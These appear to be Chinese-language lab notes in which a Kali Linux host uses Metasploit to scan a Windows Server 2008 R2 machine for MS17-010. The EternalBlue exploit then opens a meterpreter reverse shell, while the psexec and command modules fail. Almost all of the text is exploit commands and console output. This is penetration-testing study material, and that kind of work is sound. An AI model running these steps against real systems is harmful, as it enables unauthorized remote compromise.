## 環境
 1. 攻擊方 == Kali Linux
 2. 標靶機 == Windows Server 2008

## [掃描是否有ms17_010漏洞](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)

### 使用nmap掃描

```

```

### 使用metasploit3掃描
```
msf6 > search ms17_010
                                                                                                                    
Matching Modules                                                                                                    
================                                                                                                    
                                                                                                                    
   #  Name                                      Disclosure Date  Rank     Check  Description                        
   -  ----                                      ---------------  ----     -----  -----------                        
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                                                                                         
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010

msf6 > use auxiliary/scanner/smb/smb_ms17_010       
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
                                                                                                                                                                                                                                             
Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.111.130
RHOST => 192.168.111.130

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.111.130:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.111.130:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 使用metasploit來進行攻擊
### ms17_010_eternalblue
```
msf6 exploit(windows/smb/ms17_010_psexec) > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.111.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.111.130
RHOST => 192.168.111.130
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.111.128:4444 
[*] 192.168.111.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.111.130:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.111.130:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.111.130:445 - The target is vulnerable.
[*] 192.168.111.130:445 - Connecting to target for exploitation.
[+] 192.168.111.130:445 - Connection established for exploitation.
[+] 192.168.111.130:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.111.130:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.111.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.111.130:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 192.168.111.130:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.111.130:445 - 0x00000030  6b 20 31                                         k 1             
[+] 192.168.111.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.111.130:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.111.130:445 - Sending all but last fragment of exploit packet
[*] 192.168.111.130:445 - Starting non-paged pool grooming
[+] 192.168.111.130:445 - Sending SMBv2 buffers
[+] 192.168.111.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.111.130:445 - Sending final SMBv2 buffers.
[*] 192.168.111.130:445 - Sending last fragment of exploit packet!
[*] 192.168.111.130:445 - Receiving response from exploit packet
[+] 192.168.111.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.111.130:445 - Sending egg to corrupted connection.
[*] 192.168.111.130:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 192.168.111.130
[*] Meterpreter session 1 opened (192.168.111.128:4444 -> 192.168.111.130:50027) at 2022-03-19 03:43:07 -0400
[+] 192.168.111.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.111.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.111.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```
### ms17_010_command  沒有成功
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > use auxiliary/admin/smb/ms17_010_command 
msf6 auxiliary(admin/smb/ms17_010_command) > show options

Module options (auxiliary/admin/smb/ms17_010_command):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   COMMAND               net group "Domain Admins" /domain                               yes       The command you want to execute on the remote host
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBSHARE              C$                                                              yes       The name of a writeable share on the server
   SMBUser                                                                               no        The username to authenticate as
   THREADS               1                                                               yes       The number of concurrent threads (max one per host)
   WINPATH               WINDOWS                                                         yes       The name of the remote Windows directory

msf6 auxiliary(admin/smb/ms17_010_command) > set RHOST 192.168.111.130
RHOST => 192.168.111.130
msf6 auxiliary(admin/smb/ms17_010_command) > run

[*] 192.168.111.130:445   - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
[-] 192.168.111.130:445   - Unable to find accessible named pipe!
[*] 192.168.111.130:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### ms17_010_psexec  沒有成功
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > search ms17_010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/smb/smb_ms17_010

msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.111.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/ms17_010_psexec) > set RHOST 192.168.111.130
RHOST => 192.168.111.130
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 192.168.111.128:4444 
[*] 192.168.111.130:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
[-] 192.168.111.130:445 - Unable to find accessible named pipe!
[*] Exploit completed, but no session was created.
```
